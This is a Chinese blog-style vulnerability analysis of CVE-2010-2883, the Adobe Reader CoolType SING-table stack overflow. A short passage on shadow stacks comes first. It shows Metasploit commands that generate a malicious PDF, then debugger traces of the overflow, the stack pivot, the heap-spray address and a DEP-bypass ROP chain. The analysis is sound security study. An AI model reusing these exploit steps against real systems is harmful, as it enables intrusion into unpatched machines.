<h2 id="3-影子栈"><a href="#3-影子栈" class="headerlink" title="3 影子栈"></a>3 影子栈</h2><p>当启用影子堆栈时，Near CALL压入返回地址到数据堆栈和影子堆栈上；Near RET 从影子堆栈和数据堆栈弹出返回地址。 如果指定了可选的“n”操作数，则数据堆栈指针（ESP / RSP）可选地进一步增加“n”个字节，但是影子堆栈指针（SSP）不递增。如果从两个堆栈弹出的返回地址不相同，那么处理器会导致#CP（near-ret）异常。</p>
]]></content>
      <categories>
        <category>程序员的自我修养</category>
      </categories>
      <tags>
        <tag>保护措施</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2010-2883 Adobe Reader TFF字体SING表栈溢出</title>
    <url>/year/06/04/cl7iordof000n293f61sk8uz8/</url>
    <content><![CDATA[<p>在Adobe Reader和Acrobat 9.4之前的9.x版本中用于实现CoolType(清晰显示文本的字体还原技术)技术的库CoolType.dll中在解析TrueType字体文件中的SING表的uniqueName字段时调用的strcat函数<strong>未检查长度</strong>导致存在基于栈的缓冲区溢出漏洞。远程攻击者可构造恶意的SmartINdependent Glyphlets (SING)表修改内存数据从而执行任意代码。</p>
<a id="more"></a>

<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p><strong>漏洞编号:</strong> CVE-2010-2883</p>
<p><strong>复现环境:</strong></p>
<p>操作系统 Windows XP SP3</p>
<p>虚拟机 Vmware 15 Pro</p>
<p>漏洞软件 Adobe Reader 9.3.4</p>
<h2 id="样本生成"><a href="#样本生成" class="headerlink" title="样本生成"></a>样本生成</h2><p>这里我们先借助Metasploit帮助我们生成一个样本用于动态调试(之后会分析这个样本是如何构造出来的)。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>

<p>首先在Kali中调用msfconsole唤出我们的msf。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf &gt; search cve-2010-2883</span><br></pre></td></tr></table></figure>

<p>搜索cve-2010-2883漏洞编号可以列出可用的exploit。</p>
<p>我是unbuntu系统，这个文件在/opt目录下</p>
<p>然后找/metasploit-framework/modules/exploits/windows/fileformat/adobe_cooltype_sing.rb</p>
<p>为了便于等下动态调试识别一些关键数据块，我们考虑修改一下这个exploit的一处地方。</p>
<p>在这个exploit的102行处，将下面这句代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sing &lt;&lt; rand_text(<span class="number">0x254</span> - sing.length)</span><br></pre></td></tr></table></figure>

<p>改为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sing &lt;&lt; &quot;A&quot; * (0x254 - sing.length)</span><br></pre></td></tr></table></figure>

<p>这里的rand_text主要作用是取随机字符，目的是为了增强样本的随机性从而躲避一些检测。这里我们只做研究之用，所以不必随机。修改之后保存</p>
<p>使用这个exp</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf exploit(windows/fileformat/adobe_cooltype_sing) &gt; <span class="built_in">set</span> payload windows/<span class="built_in">exec</span></span><br></pre></td></tr></table></figure>

<p>然后设置有效载荷为windows/exec用来执行命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf exploit(windows/fileformat/adobe_cooltype_sing) &gt; <span class="built_in">set</span> cmd calc.exe</span><br></pre></td></tr></table></figure>

<p>设置为启动计算器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf exploit(windows/fileformat/adobe_cooltype_sing) &gt; <span class="built_in">set</span> filename cve20102883.pdf</span><br></pre></td></tr></table></figure>

<p>最后设置一下生成的样本文件名</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf exploit(windows/fileformat/adobe_cooltype_sing) &gt; exploit</span><br></pre></td></tr></table></figure>

<p>执行一下，样本就被生成在了 /root/.msf4/local/cve20102883.pdf</p>
<p>然后拷贝出来放到Windows SP3虚拟机上的复现环境中。</p>
<h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>由于已经知道是SING处出了问题，那么用ida直接查找字符串，定位到这里，漏洞函数就是strcat。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:0803DD74                 push    offset aSing    ; &quot;SING&quot;</span><br><span class="line">.text:0803DD79                 push    edi             ; int</span><br><span class="line">.text:0803DD7A                 lea     ecx, [ebp+108h+var_12C]</span><br><span class="line">.text:0803DD7D                 call    sub_8021B06</span><br><span class="line">.text:0803DD82                 mov     eax, [ebp+108h+var_12C]</span><br><span class="line">.text:0803DD85                 cmp     eax, esi</span><br><span class="line">.text:0803DD85 ;   &#125; // starts at 803DD53</span><br><span class="line">.text:0803DD87 ;   try &#123;</span><br><span class="line">.text:0803DD87                 mov     byte ptr [ebp+108h+var_10C], 2</span><br><span class="line">.text:0803DD8B                 jz      short loc_803DDC4</span><br><span class="line">.text:0803DD8D                 mov     ecx, [eax]</span><br><span class="line">.text:0803DD8F                 and     ecx, 0FFFFh</span><br><span class="line">.text:0803DD95                 jz      short loc_803DD9F</span><br><span class="line">.text:0803DD97                 cmp     ecx, 100h</span><br><span class="line">.text:0803DD9D                 jnz     short loc_803DDC0</span><br><span class="line">.text:0803DD9F</span><br><span class="line">.text:0803DD9F loc_803DD9F:                            ; CODE XREF: sub_803DCF9+9C↑j</span><br><span class="line">.text:0803DD9F                 add     eax, 10h</span><br><span class="line">.text:0803DDA2                 push    eax             ; char *</span><br><span class="line">.text:0803DDA3                 lea     eax, [ebp+108h+var_108]</span><br><span class="line">.text:0803DDA6                 push    eax             ; char *</span><br><span class="line">.text:0803DDA7                 mov     [ebp+108h+var_108], 0</span><br><span class="line">.text:0803DDAB                 call    strcat</span><br></pre></td></tr></table></figure>

<p>先分析strcat的参数，第一个参数是栈上一个地址，字符串拼接后会把字符拼接到这里，可以看到前面并没有对长度进行限制。</p>
<p>第二个参数盲猜应该是我们构造的rop链的地址了。</p>
<h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><p>在复现环境中把Adobe Reader 9.3.4 启动程序载入OllyDbg。加载之后F9运行。此时OllyDbg显示当前调试的程序是运行状态，实际上这个时候Adobe Reader就已经加载了CoolType.dll文件了。通过刚刚的静态分析我们了解到aSing在地址0x0803DD74处被引用。因此我们可以先在OD中在这个地址处下一个断点。快捷键Ctrl+G输入0x0803DD74回车跳转到该地址F2下断点。</p>
<p>我们将刚才的样本拖入到Adobe Reader中。程序就会停在刚才下的断点上面。</p>
<p>F7单步到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0803DD7A    8D4D DC         lea ecx,dword ptr ss:[ebp-0x24]</span><br></pre></td></tr></table></figure>

<p>执行这句指令之后我们来看看ecx到底存了什么。此时的ecx = 0x0012E4B4，首先猜测这是一个指针地址，定位到数据区域之后，取出前32位的十六进制。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0012E4B4 F4 41 6D 04</span><br></pre></td></tr></table></figure>

<p>由于在X86架构下是小端字节序，因此我们将数据排列成0x046D41F4。这应该就是ecx指针所指向的地址，定位到数据区域。可以看到如下数据</p>
<p>在分析这段数据之前我们先来看看TrueType字体格式标准文档里是怎么说的。</p>
<p><img src="/04/cl7iordof000n293f61sk8uz8/1.png" alt></p>
<p>在TrueType字体文件中，从0字节偏移的位置开始处有一个表目录。且这个表目录的第一个字段是名为sfnt version是用来表明所用ttf格式版本的字段。在文档中清楚的标注了，对于1.0版本的TTF字体文件开头要用0x00010000来表示版本。回到我们刚才0x046D41F4位置处的数据，会发现开头正好是0x00010000，这就证明了ecx保存的是一个指向ttf对象的指针地址并且在这里应该是作为this指针。</p>
<p>分析到这里，继续我们的动态调试。接下来遇到了一个call指令，意味着即将调用一个函数。在调用函数前我们不妨先看看这个函数传入了哪些参数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0803DD74    68 4CDB1908     push CoolType.0819DB4C      ; ASCII &quot;SING&quot;</span><br><span class="line">0803DD79    57              push edi</span><br></pre></td></tr></table></figure>

<p>很明显它将SING字符串当作参数了。这里我们单步F8不进入call函数内部。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0803DD7D    E8 843DFEFF     call CoolType.08021B06</span><br><span class="line">0803DD82    8B45 DC         mov eax,dword ptr ss:[ebp-0x24]</span><br></pre></td></tr></table></figure>

<p>来看看这里的eax变成了什么。</p>
<p>eax = 0x046BE598</p>
<p>数据窗口跟随就会发现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">046BE598  00 00 01 00 01 0E 00 01  ....</span><br><span class="line">046BE5A0  00 00 00 00 00 00 00 3A  .......:</span><br><span class="line">046BE5A8  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE5B0  14 A7 82 4A 0C 0C 0C 0C  J....</span><br><span class="line">046BE5B8  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE5C0  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE5C8  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE5D0  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE5D8  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE5E0  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE5E8  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE5F0  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE5F8  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE600  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE608  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE610  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE618  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE620  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE628  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE630  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE638  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE640  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE648  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE650  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE658  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE660  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE668  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE670  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE678  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE680  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE688  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE690  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE698  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE6A0  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE6A8  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE6B0  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE6B8  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE6C0  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE6C8  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE6D0  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE6D8  C6 08 8A 4A 41 41 41 41  ?奐AAAA</span><br><span class="line">046BE6E0  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE6E8  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE6F0  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE6F8  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE700  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE708  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE710  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE718  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE720  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE728  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE730  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE738  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE740  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE748  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE750  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE758  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE760  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE768  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE770  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE778  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE780  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE788  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE790  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE798  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE7A0  38 CB 80 4A 41 41 41 41  8藔JAAAA</span><br><span class="line">046BE7A8  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE7B0  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE7B8  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE7C0  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE7C8  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE7D0  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE7D8  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE7E0  41 41 41 41 6C           AAAAl</span><br></pre></td></tr></table></figure>

<p>这里大量的A原本都是随机字符，由于刚才我们修改了exploit的代码因此使得这里的数据块更容易辨认。实际上这些数据都是样本中SING表里构造好的恶意数据。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0803</span>DD74    <span class="number">68</span> <span class="number">4</span>CDB1908     push CoolType<span class="number">.0819</span>DB4C   ; ASCII <span class="string">"SING"</span></span><br><span class="line"><span class="number">0803</span>DD79    <span class="number">57</span>               push edi</span><br><span class="line"><span class="number">0803</span>DD7A    <span class="number">8</span>D4D DC         lea ecx,dword ptr ss:[ebp<span class="number">-0x24</span>]</span><br><span class="line"><span class="number">0803</span>DD7D    E8 <span class="number">843</span>DFEFF     call CoolType<span class="number">.08021B</span>06</span><br><span class="line"><span class="number">0803</span>DD82    <span class="number">8B</span>45 DC         mov eax,dword ptr ss:[ebp<span class="number">-0x24</span>]</span><br></pre></td></tr></table></figure>

<p>因此总结一下，以上的指令主要就是将SING表的tag名传入到08021B06函数中通过表目录来获取到SING表的入口地址，而目前eax的值0x046BE598即是SING表的入口地址。分析SING表的这些数据，我们就能知道样本到底做了些什么。</p>
<p>继续往下动态调试，会发现关键的溢出点。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0803DDA2    50              push eax</span><br><span class="line">0803DDA3    8D45 00         lea eax,dword ptr ss:[ebp]</span><br><span class="line">0803DDA6    50              push eax</span><br><span class="line">0803DDA7    C645 00 00      mov byte ptr ss:[ebp],0x0</span><br><span class="line">0803DDAB    E8 483D1300     call &lt;jmp.&amp;MSVCR80.strcat&gt;</span><br></pre></td></tr></table></figure>

<p>第一个pusheax 将刚刚获取到的SING表入口地址压入栈区。第二个 pusheax获取了当前栈区的ebp地址即要连接字符串的目的地址。我们单步过strcat之后，查看一下ebp开始的栈区数据。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0012E4D8   41414141</span><br><span class="line">0012E4DC   41414141</span><br><span class="line">0012E4E0   4A82A714  icucnv36.4A82A714</span><br><span class="line">0012E4E4   0C0C0C0C</span><br><span class="line">0012E4E8   41414141</span><br><span class="line">0012E4EC   41414141</span><br><span class="line">0012E4F0   41414141</span><br><span class="line">0012E4F4   41414141</span><br><span class="line">0012E4F8   41414141</span><br><span class="line">0012E4FC   41414141</span><br><span class="line">0012E500   41414141</span><br><span class="line">0012E504   41414141</span><br><span class="line">0012E508   41414141</span><br><span class="line">0012E50C   41414141</span><br><span class="line">0012E510   41414141</span><br><span class="line">0012E514   41414141</span><br><span class="line">0012E518   41414141</span><br><span class="line">0012E51C   41414141</span><br><span class="line">0012E520   41414141</span><br><span class="line">0012E524   41414141</span><br><span class="line">0012E528   41414141</span><br><span class="line">0012E52C   41414141</span><br><span class="line">0012E530   41414141</span><br><span class="line">0012E534   41414141</span><br><span class="line">0012E538   41414141</span><br><span class="line">0012E53C   41414141</span><br><span class="line">0012E540   41414141</span><br><span class="line">0012E544   41414141</span><br><span class="line">0012E548   41414141</span><br><span class="line">0012E54C   41414141</span><br><span class="line">0012E550   41414141</span><br><span class="line">0012E554   41414141</span><br><span class="line">0012E558   41414141</span><br><span class="line">0012E55C   41414141</span><br><span class="line">0012E560   41414141</span><br><span class="line">0012E564   41414141</span><br><span class="line">0012E568   41414141</span><br><span class="line">0012E56C   41414141</span><br><span class="line">0012E570   41414141</span><br><span class="line">0012E574   41414141</span><br><span class="line">0012E578   41414141</span><br><span class="line">0012E57C   41414141</span><br><span class="line">0012E580   41414141</span><br><span class="line">0012E584   41414141</span><br><span class="line">0012E588   41414141</span><br><span class="line">0012E58C   41414141</span><br><span class="line">0012E590   41414141</span><br><span class="line">0012E594   41414141</span><br><span class="line">0012E598   41414141</span><br><span class="line">0012E59C   41414141</span><br><span class="line">0012E5A0   41414141</span><br><span class="line">0012E5A4   41414141</span><br><span class="line">0012E5A8   41414141</span><br><span class="line">0012E5AC   41414141</span><br><span class="line">0012E5B0   41414141</span><br><span class="line">0012E5B4   41414141</span><br><span class="line">0012E5B8   41414141</span><br><span class="line">0012E5BC   41414141</span><br><span class="line">0012E5C0   41414141</span><br><span class="line">0012E5C4   41414141</span><br><span class="line">0012E5C8   41414141</span><br><span class="line">0012E5CC   41414141</span><br><span class="line">0012E5D0   41414141</span><br><span class="line">0012E5D4   41414141</span><br><span class="line">0012E5D8   41414141</span><br><span class="line">0012E5DC   41414141</span><br><span class="line">0012E5E0   41414141</span><br><span class="line">0012E5E4   41414141</span><br><span class="line">0012E5E8   41414141</span><br><span class="line">0012E5EC   41414141</span><br><span class="line">0012E5F0   41414141</span><br><span class="line">0012E5F4   41414141</span><br><span class="line">0012E5F8   41414141</span><br><span class="line">0012E5FC   41414141</span><br><span class="line">0012E600   41414141</span><br><span class="line">0012E604   41414141</span><br><span class="line">0012E608   4A8A08C6  icucnv36.4A8A08C6</span><br><span class="line">0012E60C   41414141</span><br><span class="line">0012E610   41414141</span><br><span class="line">0012E614   41414141</span><br><span class="line">0012E618   41414141</span><br><span class="line">0012E61C   41414141</span><br><span class="line">0012E620   41414141</span><br><span class="line">0012E624   41414141</span><br><span class="line">0012E628   41414141</span><br><span class="line">0012E62C   41414141</span><br><span class="line">0012E630   41414141</span><br><span class="line">0012E634   41414141</span><br><span class="line">0012E638   41414141</span><br><span class="line">0012E63C   41414141</span><br><span class="line">0012E640   41414141</span><br><span class="line">0012E644   41414141</span><br><span class="line">0012E648   41414141</span><br><span class="line">0012E64C   41414141</span><br><span class="line">0012E650   41414141</span><br><span class="line">0012E654   41414141</span><br><span class="line">0012E658   41414141</span><br><span class="line">0012E65C   41414141</span><br><span class="line">0012E660   41414141</span><br><span class="line">0012E664   41414141</span><br><span class="line">0012E668   41414141</span><br><span class="line">0012E66C   41414141</span><br><span class="line">0012E670   41414141</span><br><span class="line">0012E674   41414141</span><br><span class="line">0012E678   41414141</span><br><span class="line">0012E67C   41414141</span><br><span class="line">0012E680   41414141</span><br><span class="line">0012E684   41414141</span><br><span class="line">0012E688   41414141</span><br><span class="line">0012E68C   41414141</span><br><span class="line">0012E690   41414141</span><br><span class="line">0012E694   41414141</span><br><span class="line">0012E698   41414141</span><br><span class="line">0012E69C   41414141</span><br><span class="line">0012E6A0   41414141</span><br><span class="line">0012E6A4   41414141</span><br><span class="line">0012E6A8   41414141</span><br><span class="line">0012E6AC   41414141</span><br><span class="line">0012E6B0   41414141</span><br><span class="line">0012E6B4   41414141</span><br><span class="line">0012E6B8   41414141</span><br><span class="line">0012E6BC   41414141</span><br><span class="line">0012E6C0   41414141</span><br><span class="line">0012E6C4   41414141</span><br><span class="line">0012E6C8   41414141</span><br><span class="line">0012E6CC   41414141</span><br><span class="line">0012E6D0   4A80CB38  返回到 icucnv36.4A80CB38 来自 icucnv36.4A846C49</span><br><span class="line">0012E6D4   41414141</span><br><span class="line">0012E6D8   41414141</span><br><span class="line">0012E6DC   41414141</span><br><span class="line">0012E6E0   41414141</span><br><span class="line">0012E6E4   41414141</span><br><span class="line">0012E6E8   41414141</span><br><span class="line">0012E6EC   41414141</span><br><span class="line">0012E6F0   41414141</span><br><span class="line">0012E6F4   41414141</span><br><span class="line">0012E6F8   41414141</span><br><span class="line">0012E6FC   41414141</span><br><span class="line">0012E700   41414141</span><br><span class="line">0012E704   41414141</span><br><span class="line">0012E708   41414141</span><br><span class="line">0012E70C   41414141  指向下一个 SEH 记录的指针</span><br><span class="line">0012E710   41414141  SE处理程序</span><br><span class="line">0012E714   0000006C</span><br></pre></td></tr></table></figure>

<p>此时栈溢出已经发生，栈区数据已经被修改成了SING表中构造的恶意数据(实际上是从uniqueName字段开始的数据)。</p>
<p>继续往下分析，我们希望了解程序到底是怎么样去读取栈区数据的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0808B308    FF10            call dword ptr ds:[eax]</span><br></pre></td></tr></table></figure>

<p>执行到0x0808B308时，我们发现了一个很有意思的地方。即调用了[eax]地址指向的函数。此时的eax = 0012E6D0，这正好处于我们刚才覆盖的栈区数据范围内。</p>
<p>且 [eax]= 0x4A80CB38。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">4</span>A80CB38    <span class="number">81</span>C5 <span class="number">94070000</span>   add ebp,<span class="number">0x794</span></span><br><span class="line"><span class="number">4</span><span class="function">A80CB3E    C9              <span class="title">leave</span>  <span class="params">(mov esp,ebp  pop ebp)</span></span></span><br><span class="line"><span class="function">4A80CB3F    C3              retn</span></span><br></pre></td></tr></table></figure>

<p>首先调整了ebp。原本的ebp = 0x0012DD48 ebp+0x794 = 0x0012E4DC</p>
<p>重新将ebp调整进了覆盖的栈区数据范围内。接下来执行的leave，修改了esp，原本的esp = 0x0012DD24 esp = ebp = 0x0012E4DC [esp] = 0x41414141 并且弹栈之后</p>
<p>ebp = 0x41414141</p>
<p>最后retn时，esp = 0x0012E4E0 [esp] = 0x4A82A714 因此接下来EIP = 0x4A82A714</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4A82A714    5C              pop esp                  ; 0C0C0C0C</span><br><span class="line">4A82A715    C3              retn</span><br></pre></td></tr></table></figure>

<p>这里原本的esp= 0x0012E4E4 [esp] = 0x0C0C0C0C</p>
<p>pop esp之后 esp = 0x0C0C0C0C</p>
<p>跳转地址的稳定性其实主要依靠0x4A82A714和0x4A80CB38这两处的地址，他们都位于icucnv36.dll的地址，而在Aodobe Reader的各种版本上，这个dll上的这两处地址是始终不变的，因而保持了各版本的兼容性和Exp的稳定性。上面的0C0C0C0C正是样本特意构造的，然后通过嵌入到pdf的JavaScripe实现<a href="[https://v1ckydxp.github.io/2019/07/22/2019-07-22-%E5%A0%86%E5%96%B7%E5%B0%84&%E5%A0%86%E9%A3%8E%E6%B0%B4/](https://v1ckydxp.github.io/2019/07/22/2019-07-22-堆喷射&堆风水/)">Heap Spary</a>,进而跳入shellcode执行代码。0x0C0C0C0C正是绕过DEP的关键部分</p>
<p>让我们看下0x0C0C0C0C处的内容,也就是我们接下来要执行的ROP链</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0C0C0C0C   4A8063A5  icucnv36.4A8063A5</span><br><span class="line">0C0C0C10   4A8A0000  icucnv36.4A8A0000</span><br><span class="line">0C0C0C14   4A802196  icucnv36.4A802196</span><br><span class="line">0C0C0C18   4A801F90  icucnv36.4A801F90</span><br><span class="line">0C0C0C1C   4A84903C  &lt;&amp;KERNEL32.CreateFileA&gt;</span><br><span class="line">0C0C0C20   4A80B692  icucnv36.4A80B692</span><br><span class="line">0C0C0C24   4A801064  icucnv36.4A801064</span><br><span class="line">0C0C0C28   4A8522C8  icucnv36.4A8522C8</span><br><span class="line">0C0C0C2C   10000000  sqlite.10000000</span><br><span class="line">0C0C0C30   00000000</span><br><span class="line">0C0C0C34   00000000</span><br><span class="line">0C0C0C38   00000002</span><br><span class="line">0C0C0C3C   00000102</span><br><span class="line">0C0C0C40   00000000</span><br><span class="line">0C0C0C44   4A8063A5  icucnv36.4A8063A5</span><br><span class="line">0C0C0C48   4A801064  icucnv36.4A801064</span><br><span class="line">0C0C0C4C   4A842DB2  icucnv36.4A842DB2</span><br><span class="line">0C0C0C50   4A802AB1  icucnv36.4A802AB1</span><br><span class="line">0C0C0C54   00000008</span><br><span class="line">0C0C0C58   4A80A8A6  icucnv36.4A80A8A6</span><br><span class="line">0C0C0C5C   4A801F90  icucnv36.4A801F90</span><br><span class="line">0C0C0C60   4A849038  &lt;&amp;KERNEL32.CreateFileMappingA&gt;</span><br><span class="line">0C0C0C64   4A80B692  icucnv36.4A80B692</span><br><span class="line">0C0C0C68   4A801064  icucnv36.4A801064</span><br><span class="line">0C0C0C6C   FFFFFFFF</span><br><span class="line">0C0C0C70   00000000</span><br><span class="line">0C0C0C74   00000040</span><br><span class="line">0C0C0C78   00000000</span><br><span class="line">0C0C0C7C   00010000  UNICODE &quot;=::=::\&quot;</span><br><span class="line">0C0C0C80   00000000</span><br><span class="line">0C0C0C84   4A8063A5  icucnv36.4A8063A5</span><br><span class="line">0C0C0C88   4A801064  icucnv36.4A801064</span><br><span class="line">0C0C0C8C   4A842DB2  icucnv36.4A842DB2</span><br><span class="line">0C0C0C90   4A802AB1  icucnv36.4A802AB1</span><br><span class="line">0C0C0C94   00000008</span><br><span class="line">0C0C0C98   4A80A8A6  icucnv36.4A80A8A6</span><br><span class="line">0C0C0C9C   4A801F90  icucnv36.4A801F90</span><br><span class="line">0C0C0CA0   4A849030  &lt;&amp;KERNEL32.MapViewOfFile&gt;</span><br><span class="line">0C0C0CA4   4A80B692  icucnv36.4A80B692</span><br><span class="line">0C0C0CA8   4A801064  icucnv36.4A801064</span><br><span class="line">0C0C0CAC   FFFFFFFF</span><br><span class="line">0C0C0CB0   00000022</span><br><span class="line">0C0C0CB4   00000000</span><br><span class="line">0C0C0CB8   00000000</span><br><span class="line">0C0C0CBC   00010000  UNICODE &quot;=::=::\&quot;</span><br><span class="line">0C0C0CC0   4A8063A5  icucnv36.4A8063A5</span><br><span class="line">0C0C0CC4   4A8A0004  UNICODE &quot;社&quot;</span><br><span class="line">0C0C0CC8   4A802196  icucnv36.4A802196</span><br><span class="line">0C0C0CCC   4A8063A5  icucnv36.4A8063A5</span><br><span class="line">0C0C0CD0   4A801064  icucnv36.4A801064</span><br><span class="line">0C0C0CD4   4A842DB2  icucnv36.4A842DB2</span><br><span class="line">0C0C0CD8   4A802AB1  icucnv36.4A802AB1</span><br><span class="line">0C0C0CDC   00000030</span><br><span class="line">0C0C0CE0   4A80A8A6  icucnv36.4A80A8A6</span><br><span class="line">0C0C0CE4   4A801F90  icucnv36.4A801F90</span><br><span class="line">0C0C0CE8   4A8A0004  UNICODE &quot;社&quot;</span><br><span class="line">0C0C0CEC   4A80A7D8  返回到 icucnv36.uprv_timezone_3_6+6 来自 msvcr80.__timezone</span><br><span class="line">0C0C0CF0   4A8063A5  icucnv36.4A8063A5</span><br><span class="line">0C0C0CF4   4A801064  icucnv36.4A801064</span><br><span class="line">0C0C0CF8   4A842DB2  icucnv36.4A842DB2</span><br><span class="line">0C0C0CFC   4A802AB1  icucnv36.4A802AB1</span><br><span class="line">0C0C0D00   00000020</span><br><span class="line">0C0C0D04   4A80A8A6  icucnv36.4A80A8A6</span><br><span class="line">0C0C0D08   4A8063A5  icucnv36.4A8063A5</span><br><span class="line">0C0C0D0C   4A801064  icucnv36.4A801064</span><br><span class="line">0C0C0D10   4A80AEDC  icucnv36.4A80AEDC</span><br><span class="line">0C0C0D14   4A801F90  icucnv36.4A801F90</span><br><span class="line">0C0C0D18   00000034</span><br><span class="line">0C0C0D1C   4A80D585  icucnv36.4A80D585</span><br><span class="line">0C0C0D20   4A8063A5  icucnv36.4A8063A5</span><br><span class="line">0C0C0D24   4A801064  icucnv36.4A801064</span><br><span class="line">0C0C0D28   4A842DB2  icucnv36.4A842DB2</span><br><span class="line">0C0C0D2C   4A802AB1  icucnv36.4A802AB1</span><br><span class="line">0C0C0D30   0000000A</span><br><span class="line">0C0C0D34   4A80A8A6  icucnv36.4A80A8A6</span><br><span class="line">0C0C0D38   4A801F90  icucnv36.4A801F90</span><br><span class="line">0C0C0D3C   4A849170  &lt;&amp;MSVCR80.memcpy&gt;</span><br><span class="line">0C0C0D40   4A80B692  icucnv36.4A80B692</span><br></pre></td></tr></table></figure>

